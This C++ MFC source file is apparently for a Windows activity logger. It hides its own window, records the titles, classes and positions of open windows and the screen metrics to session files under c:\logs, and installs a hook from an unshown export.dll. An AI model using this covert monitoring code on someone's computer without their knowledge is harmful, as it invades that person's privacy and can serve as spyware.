// loggerDlg.cpp : implementation file
//

#include "stdafx.h"
#include "logger.h"
#include "loggerDlg.h"
#include "time.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif
/////////////////////////////////////////////////////////////////////////////
// CLoggerDlg dialog

#define MYWM_NOTIFYICON (WM_USER+1)
  //User defined messages. 
  
  CMenu m_TrayMenu;
  //Displaying menu when right clicked on the system tray. Should be inside the class definition
  
  NOTIFYICONDATA tnd;
  //Icon Data
  
  afx_msg LRESULT onTrayNotify(WPARAM, LPARAM);
  //Function to handle the user messages 

CLoggerDlg::CLoggerDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CLoggerDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CLoggerDlg)
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CLoggerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CLoggerDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CLoggerDlg, CDialog)
	//{{AFX_MSG_MAP(CLoggerDlg)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_CLOSE()
	ON_WM_LBUTTONDOWN()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CLoggerDlg message handlers

char session[40] = "c:\\logs\\session";
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{

	//crude solution
	char temp[500]; int len = 0;
	if (!IsWindowVisible(hwnd) || GetWindow(hwnd, GW_OWNER) != NULL)
        return TRUE;
	GetClassName(hwnd, temp, 50);
//	if(!strcmp(temp, "Progman"))
//		return TRUE;
    TCHAR szText[256];
    DWORD cchText = GetWindowText(hwnd, szText, 256);
	
    if (cchText == 0)
        return TRUE;
	
	
	FILE* f0=fopen(session,"a");

	
	
	itoa((int)hwnd, temp, 10);

	len = strlen(temp);
	temp[len++] = ' ';
	GetClassName(hwnd, &temp[len], 50);

	len = strlen(temp);

/////// bo phan nay trong comment de khoi lay title

	temp[len++] = ' ';
	::GetWindowText(hwnd, &temp[len], 50);	
	len = strlen(temp);

//////

	temp[len++] = '\n';
	temp[len] = '\0';
	fwrite(temp,1,len,f0);

	char i = ' ';
	CRect r;
	::GetWindowRect(hwnd, &r);
	itoa(r.top, temp, 10);
	fwrite(temp, 1, strlen(temp),f0);
	fwrite(&i,1,1,f0);
	itoa(r.bottom, temp, 10);
	fwrite(temp, 1, strlen(temp),f0);
	fwrite(&i,1,1,f0);
	itoa(r.left, temp, 10);
	fwrite(temp, 1, strlen(temp),f0);
	fwrite(&i,1,1,f0);
	itoa(r.right, temp, 10);
	fwrite(temp, 1, strlen(temp),f0);
	fwrite(&i,1,1,f0);
	
	i = '\n';
	fwrite(&i,1,1,f0);
	fclose(f0);
	return true;
}


BOOL CLoggerDlg::OnInitDialog()
{
	ShowWindow(SW_HIDE);
	CDialog::OnInitDialog();

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here

	FILE* f=fopen("config.txt", "r");
	char number[10];
	
	int num;
	fscanf(f, "%d", &num);
	fclose(f);
	
	itoa(++num, number, 10);
	f=fopen("config.txt", "w");
	fprintf(f, "%d", num);
	fclose(f);

	strcat(number, ".txt");
	strcat(session, number);


	FILE* f0=fopen(session,"w");
	char temp[50];

	time_t rawtime;
	
	time ( &rawtime );
	itoa((int)rawtime, temp, 10);
	int len = strlen(temp);
	temp[len++] = '\n';
	temp[len] = '\0';
	fwrite(temp,1,len,f0);

	char str[51];


	int x = GetSystemMetrics(SM_CMONITORS);
	itoa(x, str, 10);
	fwrite(str, 1, strlen(str),f0);

	char i ='\n';
	fwrite(&i,1,sizeof(i),f0);
	i= ' ';

	x = GetSystemMetrics(SM_CXSCREEN);
	itoa(x, str, 10);
	fwrite(str, 1, strlen(str),f0);
	fwrite(&i,1,sizeof(i),f0);
	x = GetSystemMetrics(SM_CYSCREEN);
	itoa(x, str, 10);
	fwrite(str, 1, strlen(str),f0);
	fwrite(&i,1,sizeof(i),f0);
	x = GetSystemMetrics(SM_CXVIRTUALSCREEN);
	itoa(x, str, 10);
	fwrite(str, 1, strlen(str),f0);
	fwrite(&i,1,sizeof(i),f0);
	x = GetSystemMetrics(SM_CYVIRTUALSCREEN);
	itoa(x, str, 10);
	fwrite(str, 1, strlen(str),f0);
	
	i ='\n';
	fwrite(&i,1,sizeof(i),f0);
	fclose(f0);

	EnumWindows(::EnumWindowsProc, (LPARAM) 0);

	static HINSTANCE hinstDLL; 
	typedef BOOL (CALLBACK *inshook)(); 
	inshook hook;
	hinstDLL = LoadLibrary((LPCTSTR) "export.dll"); 
	hook = (inshook)GetProcAddress(hinstDLL, "Hook"); 
	hook();

	
	return TRUE;  // return TRUE  unless you set the focus to a control
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CLoggerDlg::OnPaint() 
{
	ShowWindow(SW_HIDE);
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CLoggerDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

void CLoggerDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	static HINSTANCE hinstDLL; 
	typedef BOOL (CALLBACK *uninshook)(); 
	uninshook unhook;
	hinstDLL = LoadLibrary((LPCTSTR) "export.dll"); 
	unhook = (uninshook)GetProcAddress(hinstDLL, "UnHook"); 
	unhook();

	CDialog::OnDestroy();
	
	exit(0);
}
